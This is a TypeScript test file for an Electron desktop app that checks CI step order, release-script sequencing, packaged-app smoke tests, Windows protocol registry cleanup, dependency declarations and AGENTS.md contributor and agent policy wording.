      /(?:^|[\s/])check[-:]/u.test(command)
    );
    expect(assertions).toEqual([
      "bun run check:import-cycles",
      "node scripts/check-generated-assets.mjs",
      "bun run check:plugin-host-protocol-schema",
      "bun run check:plugin-host-protocol-mirror",
      "bun run check:plugin-host-protocol-client",
      "bun run check:i18n-catalog",
      "bun run check:i18n-barrels",
      "node scripts/check-no-tls-bypass.mjs",
      "node scripts/check-opacity-tokens.mjs",
      "node scripts/check-color-tokens.mjs",
      "node scripts/check-shell-geometry-tokens.mjs",
      "node scripts/check-no-inline-channels.mjs",
      "node scripts/check-sandboxed-preloads.mjs",
      "bun run check:source-text-safe",
    ]);

    // Of those fourteen, the seven that a later command in the same composite
    // compiles behind. ci.yml's comment states this number; this is where it
    // comes from.
    const lastCompile = commands.reduce(
      (found, command, index) =>
        /bun run build:/u.test(command) ? index : found,
      -1,
    );
    expect(lastCompile).toBeGreaterThan(0);
    expect(
      assertions.filter((command) => commands.indexOf(command) < lastCompile),
    ).toEqual([
      "bun run check:import-cycles",
      "node scripts/check-generated-assets.mjs",
      "bun run check:plugin-host-protocol-schema",
      "bun run check:plugin-host-protocol-mirror",
      "bun run check:plugin-host-protocol-client",
      "bun run check:i18n-catalog",
      "bun run check:i18n-barrels",
    ]);
  });

  it("runs the protocol mirror gate and refreshes the release candidate", () => {
    expect(packageScripts["check:plugin-host-protocol-mirror"]).toBe(
      "node scripts/check-plugin-host-protocol-mirror.mjs",
    );
    expect(readRepoFile("scripts/release.mjs")).toContain(
      'run("node", ["scripts/sync-plugin-host-protocol-mirror.mjs"]);',
    );
  });

  it("checks the protocol client after the mirror and regenerates it after the schema on release", () => {
    expect(packageScripts["check:plugin-host-protocol-client"]).toBe(
      "node --import tsx scripts/generate-plugin-host-protocol-client.ts --check",
    );
    expect(packageScripts["generate:plugin-host-protocol-client"]).toBe(
      "node --import tsx scripts/generate-plugin-host-protocol-client.ts",
    );
    // The client is a projection of the committed schema, so it regenerates
    // after the schema does, and before the build that checks both.
    const release = readRepoFile("scripts/release.mjs");
    const schema = release.indexOf('run("bun", ["run", "generate:plugin-host-protocol-schema"]);');
    const client = release.indexOf('run("bun", ["run", "generate:plugin-host-protocol-client"]);');
    const build = release.indexOf('"scripts/build-installers.mjs"');
    expect(schema).toBeGreaterThan(-1);
    expect(client).toBeGreaterThan(schema);
    expect(build).toBeGreaterThan(client);
  });

  it("keeps the composite that orders a hygiene scan first out of CI", () => {
    // `check:test-quality` runs `check:test-duplicates` before
    // `check:test-coverage`, so a duplicated helper ends the step before a test
    // executes — the same masking defect one layer down, in an npm script
    // instead of a workflow. The workflow scan above reads workflow step order
    // and cannot see inside a script, so the composite is named here directly.
    const composite = packageScripts["check:test-quality"];
    expect(composite, "package.json has no check:test-quality").toBeDefined();
    expect(composite as string).toContain("check:test-duplicates");
    expect(composite as string).toContain("check:test-coverage");
    // The order is the reason, not the membership: a composite that ran the
    // suite first and scanned afterwards would be safe to call from a job.
    expect(
      (composite as string).indexOf("check:test-duplicates"),
    ).toBeLessThan((composite as string).indexOf("check:test-coverage"));
    for (const name of workflowFileNames()) {
      for (const [id, body] of workflowJobs(
        readRepoFile(`.github/workflows/${name}`),
      )) {
        expect(
          jobRunCommands(body).some((command) =>
            mentions(command, "check:test-quality")
          ),
          `${name}: job "${id}" calls the check:test-quality composite, which ` +
            "runs the duplicate scan before the suite. Call its halves.",
        ).toBe(false);
      }
    }
  });

  it("runs the NSIS smoke before win-unpacked and proves HKCU unclaimed afterward", () => {
    const smoke = readRepoFile("scripts/smoke-packaged-app.mjs");
    const installerSmoke = smoke.indexOf(
      "await runWindowsInstallerSmoke(releaseDir, timeoutMs)",
    );
    const unpackedSmoke = smoke.indexOf(
      "await launchSmoke(executable, timeoutMs)",
    );

    expect(installerSmoke).toBeGreaterThanOrEqual(0);
    expect(unpackedSmoke).toBeGreaterThan(installerSmoke);
    expect(
      smoke.lastIndexOf("assertNoWindowsProtocolClaim(executable)"),
    ).toBeGreaterThan(smoke.indexOf("} finally {"));
    const launchBody = smoke.slice(
      smoke.indexOf("async function launchSmoke"),
      smoke.indexOf("async function runWindowsInstallerSmoke"),
    );
    expect(launchBody.indexOf(
      "assertWindowsPerMachineMarkerAbsent(executable)",
    )).toBeLessThan(launchBody.indexOf("runPackagedAppOnce"));
    expect(smoke).toContain(".ave-nsis-per-machine-v1");
    expect(smoke).toContain(
      "lstatSync(markerPath, { throwIfNoEntry: false })",
    );
    expect(readRepoFile("src/main/ave-protocol-registration.ts"))
      .toContain(".ave-nsis-per-machine-v1");

    // The no-claim check is shared: the launch smoke and the packaged escape
    // gate both launch the full application from win-unpacked with an
    // isolated AVE_HOME and --user-data-dir, so the app must skip
    // self-registration; a claim naming that executable is removed and fails.
    const cleanupImport =
      'import { assertNoWindowsProtocolClaim } from "./lib/windows-protocol-cleanup.mjs";';
    expect(smoke).toContain(cleanupImport);
    const gate = readRepoFile("scripts/packaged-escape-gate.mjs");
    expect(gate).toContain(cleanupImport);
    const control = gate.slice(gate.indexOf("async function measureControl"), gate.indexOf("async function main"));
    expect(control).toMatch(/\} finally \{\n {4}await app\.close\(\);\n(?: {4}\/\/.*\n)* {4}assertNoWindowsProtocolClaim\(executable\);\n {2}\}/u);

    const cleanup = readRepoFile("scripts/lib/windows-protocol-cleanup.mjs");
    expect(cleanup).toContain("{ platform = process.platform, run = spawnSync } = {},");
    expect(cleanup).toContain('if (platform !== "win32") return;');
    const cleanupScript = cleanup.slice(
      cleanup.indexOf("const WINDOWS_PROTOCOL_CLEANUP_SCRIPT"),
      cleanup.indexOf('].join("\\n");') + '].join("\\n");'.length,
    );
    expect(cleanupScript.length).toBeGreaterThan(0);
    expect(cleanupScript).toContain("$expectedCommand");
    expect(cleanupScript).toContain(
      "$expectedCommand = '\\\"' + $env:AVE_PROTOCOL_OWNER_EXE + '\\\" \\\"%1\\\"'",
    );
    expect(cleanupScript).not.toContain("$launchExecutable");
    expect(cleanupScript).not.toContain("-match '\\s'");
    expect(cleanupScript).not.toContain(
      "owned ave protocol cleanup left registry residue",
    );
    expect(cleanupScript).toContain("$expectedIcon");
    expect(cleanupScript).toContain("function Remove-RegistryValueIfEquals");
    expect(cleanupScript).toContain("$key.GetValueKind($name)");
    expect(cleanupScript).toContain("$commandKind = $commandKey.GetValueKind('')");
    expect(cleanupScript).toContain(
      "if ($null -eq $rootKey) { Write-Output 'absent'; exit 0 }",
    );
    expect(cleanupScript).not.toContain(
      "expected win-unpacked HKCU ave protocol root is missing",
    );
    expect(cleanupScript.trimEnd().endsWith('"Write-Output \'removed\'",\n].join("\\n");')).toBe(true);
    expect(cleanup).toContain('if (outcome === "absent" || outcome === "foreign") return;');
    expect(cleanup).toContain('if (outcome === "removed") {');

    expect(cleanupScript).toContain(
      "[Microsoft.Win32.RegistryValueKind]::String",
    );
    expect(cleanupScript).toContain(
      "Remove-RegistryValueIfEquals $commandPath '' $expectedCommand",
    );
    expect(cleanupScript).toContain("DefaultIcon' '' $expectedIcon");
    expect(cleanupScript).toContain(
      "Remove-RegistryValueIfEquals $rootPath 'URL Protocol' ''",
    );
    expect(cleanupScript).toContain(
      "Remove-RegistryValueIfEquals $rootPath '' 'URL:ave'",
    );
    expect(cleanupScript).toContain(
      "[System.StringComparison]::OrdinalIgnoreCase",
    );
    expect(cleanupScript).toContain("$key.DeleteValue($name, $false)");
    expect(cleanupScript).toContain("Remove-EmptyRegistryKey");
    expect(cleanupScript).not.toContain("$expectedQuoted");
    expect(cleanupScript).not.toContain("$expectedUnquoted");
    expect(cleanupScript).not.toContain("StartsWith");
  });
  it("documents runtime package imports as dependencies, not devDependencies", () => {
    const agents = readRepoFile("AGENTS.md");

    expect(agents).toContain("unbundled runtime code");
    expect(agents).toContain("Renderer/UI-only");
    expect(agents).toContain("webpack/esbuild");
    expect(agents).toContain("`dependencies`");
    expect(agents).toContain("`devDependencies`");
    expect(agents).toContain("packaged-app smoke");
  });

  it("keeps cross-cutting change detection advisory", () => {
    const agents = readRepoFile("AGENTS.md");
    const claude = readRepoFile("CLAUDE.md");
    const contributing = readRepoFile(".github/CONTRIBUTING.md");
    const pullRequestTemplate = readRepoFile(".github/pull_request_template.md");
    const clusterWorkflow = readRepoFile(".github/workflows/cluster-detector.yml");
    const clusterStatusOwners = readdirSync(resolve(root, ".github/workflows"))
      .filter((name) => /\.ya?ml$/.test(name))
      .filter((name) => {
        const source = readRepoFile(`.github/workflows/${name}`);
        return /statuses:\s*write|\/statuses\//.test(source);
      })
      .sort();
    const clusterScope = readRepoFile("scripts/check-cluster-scope.mjs");
    const sensitivePathHelper = readRepoFile("scripts/check-cluster-sensitive-paths.mjs");

    expect(agents).toContain("## Cross-Cutting Change Advisory");
    expect(agents).toContain("never requires an external reviewer, collaborator");
    expect(agents).toContain("Owner self-review and automated review are valid evidence.");
    expect(agents).toContain("does not write commit");
    expect(agents).toContain("never blocks merge.");
    expect(agents).not.toContain("## Cross-Cutting Review Gate");
    expect(agents).not.toContain("cluster-review-passed");
    expect(agents).not.toContain("visible role row and hidden marker");

    expect(pullRequestTemplate).toContain("## Sensitive-Area Advisory");
    expect(pullRequestTemplate).toContain("This is not a merge gate");
    expect(pullRequestTemplate).toContain("external reviewer");
    expect(pullRequestTemplate).not.toContain("## Cross-Cutting Review Gate");
    expect(pullRequestTemplate).not.toContain("cluster-review:");
    expect(pullRequestTemplate).not.toContain("cluster-review-passed");

    expect(clusterWorkflow).toContain("pull_request_target:");
    expect(clusterWorkflow).toContain("contents: read");
    expect(clusterWorkflow).toContain("pull-requests: read");
    expect(clusterWorkflow).toContain("::warning::Sensitive-area cluster advisory");
    expect(clusterWorkflow).not.toContain("pull-requests: write");
    expect(clusterWorkflow).not.toContain("statuses: write");
    expect(clusterWorkflow).not.toContain("cluster-review-passed");
    expect(clusterStatusOwners).toEqual([]);
    expect(existsSync(resolve(root, "scripts/check-cluster-review-attestation.mjs"))).toBe(false);
    expect(existsSync(resolve(root, "test/scripts/check-cluster-review-attestation.test.ts"))).toBe(false);

    expect(clusterScope).toContain(
      'import { hasSensitiveClusterPath } from "./check-cluster-sensitive-paths.mjs"',
    );
    expect(clusterScope).toContain("previous_filename");
    expect(clusterScope).toContain("github-previous-filename-required");
    // Inverted deliberately, in the file whose job is keeping this gate
    // advisory. A repeated pull is the documented consequence of paging a
    // MUTABLE sort key while the repo is being merged into, not corruption,
    // and hard-failing on it turned an ordinary merge landing mid-scan into
    // a blocked PR. The scan skips the repeat instead; that behaviour is
    // pinned in test/scripts/check-cluster-scope.test.ts.
    expect(clusterScope).not.toContain("pull-request-page-duplicate");
    // Inverted for the same reason, one layer up. `pull-request-window-changed`
    // compared two scans of the rolling window and hard-failed on ANY
    // difference between them — a candidate's `updated_at` advancing, the same
    // members arriving in another order, or one unrelated pull merging between
    // the scans. The scans are unioned now, so a late arrival is evaluated
    // instead of reported as corruption. What survives is a BOUNDED settle
    // check: a window that never stops moving still fails, loudly and rarely.
    expect(clusterScope).not.toContain("pull-request-window-changed");
    expect(clusterScope).toContain("pull-request-window-unsettled");
    expect(clusterScope).toContain("pull-request-files-incomplete");
    expect(clusterScope).toContain("pull-request-files-saturated");
    expect(clusterScope).toContain("pull-request-commits-saturated");
    expect(clusterScope).toContain("pull-request-pages-saturated");
    expect(clusterScope).toContain('state: "closed"');
    expect(clusterScope).not.toContain("--limit 100");
    expect(sensitivePathHelper).toContain("parseNulDelimitedGitPaths");
    expect(sensitivePathHelper).toContain(
      'return !path.startsWith(`${dir}/__tests__/`)',
    );
    expect(claude).toContain("[`AGENTS.md`](./AGENTS.md)");
    expect(claude).toContain("duplicates no");

    for (const guidance of [agents, contributing, pullRequestTemplate]) {
      expect(guidance).toMatch(/documentation/i);
      expect(guidance).toMatch(/consum/i);
      expect(guidance).toMatch(/pre-push/i);
    }

    expect(agents).toContain("openFeatureNamespace");
    expect(agents).toContain("never hand-roll `mkdir`");
    expect(agents).toContain("`0o700` directory / `0o600`");
    expect(agents).toContain("mode bits alone are not encryption");
    expect(agents).toContain("src/shared/tool-timeout-policy.ts");
    expect(agents).toContain("TOOL_TIMEOUT_POLICY");
    expect(agents).toContain("runWithCeiling");
    expect(agents).toContain("AbortController");
    expect(agents).toContain("plus `Tool Governance` and `Security And Audit`");
    expect(agents).not.toContain("architecture section 6.3");
    expect(agents).toContain("OS tool sandbox defaults on for macOS/Linux and remains default-off on Windows");
    expect(agents).toContain("per `osToolSandbox`");
    expect(agents).toContain("src/data/settings-defaults.ts");
    expect(agents).toContain("On `darwin`/`linux`, explicit `AVE_SANDBOX_ENABLED=1` or\n  `AVE_PLUGIN_WORKER_CONFINEMENT=1` activation failure");
    // The two sandbox scopes stay separate in the contract: neither setting or
    // variable decides the other.
    expect(agents).toContain("`osToolSandbox` confines host shells only");
    expect(agents).toContain("`pluginWorkerConfinement` confines plugin workers");
    expect(agents).toContain("`AVE_SANDBOX_ENABLED=1` forces the shell scope only");
    expect(agents).toContain("on `isPluginWorkerConfinementActive`, never the raw `isAsrtSandboxActive`");
    expect(agents).toContain("aborts startup; settings activation warns and continues without OS isolation");
    expect(agents).toContain("Windows always warns and continues when unavailable");
    expect(agents).toContain("Keep plugin read relaxation conditional on active filesystem confinement");
    expect(agents).toContain("preserve effect-boundary enforcement");
    expect(agents).toContain("No Fallback Code");
    expect(agents).toContain("plugin manifest field updates its host schema and public");
    expect(agents).toContain("HostApi change updates the host protocol and all");
    expect(agents).toContain("UI edits start with `grep` before editing");
    expect(agents).toContain("app shells `*Window`");
    expect(agents).toContain("bodies `*Content`, and modals `*Dialog`");
    expect(agents).toContain("use the installed marketplace sources, `gh`, or");
    expect(agents).toContain("not WebSearch. After three identical failures, change approach");
    expect(agents).toContain("sender/frame/origin checks");
    expect(agents).toContain("DLP handling");
    expect(agents).toContain("fail-closed defaults");
    expect(agents).toContain("active recipient's own permission and approval");
    expect(agents).toContain("Do not bypass hooks");
    expect(agents).toContain("Never push directly to `main`");
    expect(agents).toContain("same-PR field-addition");
    expect(agents).toContain("A new IPC channel is one coherent change");
    expect(agents).toContain("gh pr merge --merge");
    expect(agents).toContain("squash merge is not allowed");
    expect(agents).not.toContain("Markdown-only pushes");
    expect(contributing).not.toContain("Markdown-only pushes");
  });

  it("declares sonic-boom as a runtime dependency (log-file-sink imports it unbundled)", () => {
    // src/lib/log-file-sink.ts adds a top-level import from "sonic-boom" that
    // the packaged main process resolves directly from app.asar (unbundled
    // runtime code). The repository AGENTS.md contract requires it in
    // `dependencies`, NOT `devDependencies` — otherwise electron-builder prunes
    // it and the installed app crashes on first log write with
    // ERR_MODULE_NOT_FOUND (the PR #684 regression class). Assert the dependency
    // declaration so a future prune-to-devDep is caught here.
    const packageJson = JSON.parse(readRepoFile("package.json")) as {
      dependencies?: Record<string, string>;
      devDependencies?: Record<string, string>;
    };
    expect(packageJson.dependencies?.["sonic-boom"]).toBeDefined();
    expect(packageJson.devDependencies?.["sonic-boom"]).toBeUndefined();

    // And the import is actually present in the unbundled runtime source, so
    // this guard tracks a real import rather than an orphaned dependency.
    const sinkSource = readRepoFile("src/lib/log-file-sink.ts");
    expect(sinkSource).toContain('from "sonic-boom"');
  });

  it("keeps fast preview installer mode separate from size-optimized release artifacts", () => {
    const packageJson = readRepoFile("package.json");
    const buildInstallers = readRepoFile("scripts/build-installers.mjs");
    const releaseChecklist = readRepoFile("docs/references/production-release-checklist.md");

    expect(packageJson).toContain('"dist:fast"');
    expect(packageJson).toContain('"dist:mac:fast"');
    expect(packageJson).toContain('"dist:win:fast"');

    expect(buildInstallers).toContain("--fast");
    expect(buildInstallers).toContain("release-fast");
    expect(buildInstallers).toContain("-c.compression=store");
    expect(buildInstallers).toContain("-c.npmRebuild=false");
    expect(buildInstallers).toContain("cannot be combined with --publish");

    expect(releaseChecklist).toContain("Fast preview mode is only for quick QA links");
    expect(releaseChecklist).toContain("Keep normal `dist:*` / `release`");
    expect(releaseChecklist).toContain("public release assets");
    expect(releaseChecklist).toContain("DMG 106M / ZIP 103M");
    expect(releaseChecklist).toContain("DMG 227M / ZIP 226M");
  });

  it("fails packaging when the platform uv payload or uv license notice is missing", () => {
    const buildInstallers = readRepoFile("scripts/build-installers.mjs");
    const afterPack = readRepoFile("scripts/electron-after-pack.cjs");
    const packageFootprint = readRepoFile("scripts/check-package-footprint.mjs");
    const runtimeAssets = readRepoFile("scripts/packaged-runtime-assets.mjs");

    expect(runtimeAssets).toContain("HOST_PACKAGED_RUNTIME_ASSETS");
    expect(runtimeAssets).toContain("PLUGIN_MANAGED_RUNTIME_ASSETS");
    expect(runtimeAssets).toContain("resources/uv-runtime");
    expect(runtimeAssets).toContain("resources/licenses/uv");
    expect(runtimeAssets).toContain("better-sqlite3-native-binding");
    expect(runtimeAssets).toContain("python-wheelhouse");
    expect(buildInstallers).toContain("hostRuntimeAssetSummary(target, arch)");
    expect(buildInstallers).toContain("required runtime assets");
    expect(buildInstallers).toContain("checkPackageFootprint(target, fast)");
    expect(buildInstallers).toContain("expected exactly one packaged app.asar");
    expect(buildInstallers).toContain("assertUvRuntimePayload(target, arch)");
    expect(buildInstallers).toContain("staged uv runtime must contain only");
    expect(buildInstallers).toContain("compressed uv archive missing from staged runtime");
    expect(buildInstallers).toContain("staged uv binary SHA mismatch");
    expect(afterPack).toContain("assertBundledUvResource(context)");
    expect(afterPack).toContain("packaged uv resource must contain exactly one target");
    expect(afterPack).toContain("packaged uv binary SHA mismatch");
    expect(afterPack).toContain("uv license notice missing");
    expect(packageFootprint).toContain("packaged uv binary SHA mismatch");
    expect(packageFootprint).toContain("uv license notice missing");
  });

  it("keeps packaged Windows smoke launch flags on the same launcher SOT", () => {
    const smokePackagedApp = readRepoFile("scripts/smoke-packaged-app.mjs");
    const smokeWindowsNsis = readRepoFile("scripts/smoke-windows-nsis-installer.mjs");
    const electronLaunchOptions = readRepoFile("scripts/lib/electron-launch-options.mjs");

    expect(smokePackagedApp).toContain("prepareElectronLaunchEnv");
    expect(smokePackagedApp).toContain("prepareElectronLaunchArgs");
    expect(smokePackagedApp).not.toContain('from "./electron-flags.mjs";');
    expect(smokeWindowsNsis).toContain("prepareElectronLaunchEnv");
    expect(smokeWindowsNsis).toContain("prepareElectronLaunchArgs");
    expect(smokeWindowsNsis).not.toContain("const WINDOWS_SAFE_GPU_FLAGS = [");
    expect(smokeWindowsNsis).not.toContain('const SANDBOX_BYPASS_FLAG = "--no-sandbox";');
    expect(electronLaunchOptions).toContain("prepareElectronLaunchEnv");
    expect(electronLaunchOptions).toContain("prepareElectronLaunchArgs");
    expect(electronLaunchOptions).toContain("SANDBOX_BYPASS_FLAG");
  });

  it("keeps #1444/#1446 packaged smoke gates wired", () => {
    const afterPack = readRepoFile("scripts/electron-after-pack.cjs");
    const smokePackagedApp = readRepoFile("scripts/smoke-packaged-app.mjs");
    const packageFootprint = readRepoFile("scripts/check-package-footprint.mjs");

    expect(afterPack).toContain("assertNodePtyBinary(context)");
    expect(afterPack).toContain("conpty.node");
    expect(afterPack).toContain("conpty_console_list.node");
    expect(afterPack).toContain("winpty.dll");
    expect(afterPack).toContain("winpty-agent.exe");
    // node-pty builds `spawn-helper` only on macOS (binding.gyp `OS=="mac"`), and
    // only macOS uses it at runtime (`pty.cc` gates helperPath on `__APPLE__`).
    // Scoping this assertion to any non-Windows platform fails every Linux
    // installer build at afterPack — it broke the v0.4.5/v0.4.6 tag builds.
    expect(afterPack).toContain('if (platform === "darwin") {');
    expect(afterPack).toContain("spawn-helper");
    expect(smokePackagedApp).toContain("assertPackagedFootprint(target, executable)");
    expect(smokePackagedApp).toContain("check-package-footprint.mjs");
    expect(smokePackagedApp).toContain("app.asar footprint passed");
    expect(packageFootprint).toContain("mermaid\\.[0-9a-f]{8}\\.js");
    expect(packageFootprint).toContain("required lazy renderer chunks missing from app.asar");
  });

  it("asserts the packaged node-pty binding where node-pty's loader resolves it", () => {
    const packageJson = JSON.parse(readRepoFile("package.json")) as {
      scripts?: Record<string, string>;
    };
    const afterPack = readRepoFile("scripts/electron-after-pack.cjs");
    const buildInstallers = readRepoFile("scripts/build-installers.mjs");
    const localChecks = readRepoFile("scripts/hooks/run-local-checks.mjs");

    // Release installers disable electron-builder's own native rebuild, so
    // `build/Release` is not an artifact any packaging step produces on
    // Windows/macOS — only an install-time `electron-rebuild` ever did.
    expect(buildInstallers).toContain('args.push("-c.npmRebuild=false")');
    // node-pty is N-API and ships per-platform prebuilds; postinstall must not
    // compile a per-Electron-ABI copy (it needs a C++ toolchain, `node-gyp
    // rebuild` deletes the working binding before it fails, and the `&&` chain
    // then skips uv fetch + hook install).
    expect(packageJson.scripts?.postinstall).not.toContain("electron-rebuild");
    // The prebuilt spawn-helper ships mode 0644; the installed copy the dev
    // app loads gets its execute bit back before anything else runs.
    expect(packageJson.scripts?.postinstall).toBe(
      "node scripts/restore-node-pty-exec-bit.mjs && node scripts/fetch-uv.mjs && node scripts/fetch-mxc.mjs --current && node scripts/hooks/install.mjs",
    );
    // afterPack follows node-pty's loader order instead of hardcoding the
    // per-ABI gyp output directory.
    expect(afterPack).toContain("function resolveNodePtyBindingDir(context) {");
    expect(afterPack).toContain("const ptyRoot = resolveNodePtyBindingDir(context);");
    expect(afterPack).toContain('join(ptyModuleRoot, "build", "Release")');
    expect(afterPack).toContain("join(ptyModuleRoot, \"prebuilds\", `${platform}-${arch}`)");
    // One arch-enum table for every packaged-native assert.
    expect(afterPack.match(/const ARCH_DIR_BY_ENUM = /gu)).toHaveLength(1);
    // ABI-drift repair still exists — it just lives only in the pre-push hook,
    // which probes first and rebuilds only when better-sqlite3 actually drifted.
    expect(localChecks).toContain('"electron-rebuild"');
    expect(localChecks).toContain("rebuildBetterSqlite3ForElectron(dir)");
  });

  it("packages only the default Electron locale in the desktop shell", () => {
    const packageJson = JSON.parse(readRepoFile("package.json")) as {
      build?: { electronLanguages?: string[] };
    };
    const packageFootprint = readRepoFile("scripts/check-package-footprint.mjs");

    expect(packageJson.build?.electronLanguages).toEqual(["en-US"]);
    expect(packageFootprint).toContain('DEFAULT_PACKAGED_ELECTRON_LANGUAGES = Object.freeze(["en-US"])');
    expect(packageFootprint).toContain("desktop app must package only the default shell language");
    expect(packageFootprint).toContain("UI catalogs are independent of browser locale files");
    expect(packageFootprint).not.toContain('["en-US", "ko"]');
    expect(packageFootprint).not.toContain('"ko.pak"');
    expect(packageFootprint).not.toContain('"ko.lproj"');
  });

  it("derives packaged runtime script footprint from the build asset SOT", () => {
    const packageFootprint = readRepoFile("scripts/check-package-footprint.mjs");

    expect(packageFootprint).toContain('import { resolveBuildAssets } from "./lib/build-assets.mjs";');
    expect(packageFootprint).toContain('resolveBuildAssets(root, "runtime-script")');
    expect(packageFootprint).not.toContain('"/dist/scripts/electron-flags.mjs",');
    expect(packageFootprint).not.toContain('"/dist/scripts/uv-targets.mjs",');
  });

  it("keeps electron-builder host runtime resources aligned with the runtime asset inventory", async () => {
    const packageJson = JSON.parse(readRepoFile("package.json")) as {
      build?: { extraResources?: Array<{ from?: string; to?: string }> };
    };
    const runtimeAssets = await import("../../scripts/packaged-runtime-assets.mjs");
    const extraResources = packageJson.build?.extraResources ?? [];
    const hostResources = runtimeAssets.HOST_PACKAGED_RUNTIME_ASSETS.flatMap(
      (asset: {
        stagedBy?: string;
        packageResource?: { from: string; to: string };
        licenseResource?: { from: string; to: string };
      }) =>
        // asar-unpacked native binaries (e.g. the better-sqlite3 N-API prebuild)
        // are packaged via asarUnpack + afterPack, not electron-builder
        // extraResources, so they are not expected in build.extraResources.
        asset.packageResource?.to?.startsWith("app.asar.unpacked/")
          ? []
          : [asset.packageResource, asset.licenseResource].filter(Boolean),
    );

    for (const resource of hostResources) {
      expect(extraResources).toContainEqual({
        from: resource.from,
        to: resource.to,
      });
    }
  });
});

it("builds the native path classifier before the Windows permission boundaries", () => {
  const job = workflowJobs(readRepoFile(".github/workflows/ci.yml")).get("windows-permission-tests");
  if (job === undefined) throw new Error("Windows permission path job is missing");
  const classifier = job.indexOf("-Helper path-kind");
  const regressions = job.indexOf("name: Run Windows permission regressions");
  expect(classifier).toBeGreaterThan(-1);
  expect(regressions).toBeGreaterThan(classifier);
  const selection = job.slice(regressions);
  for (const suite of ["src/tools/__tests__/powershell-exfiltration-gate.test.ts", "src/permissions/__tests__/powershell-unc-write-boundary.test.ts", "src/__tests__/support/fixture-owner.test.ts", "src/__tests__/support/fixture-acl-reset.test.ts", "src/permissions/__tests__/sandbox-control-writes-mxc.integration.test.ts"]) {
    expect(selection).toContain(suite);
  }
});
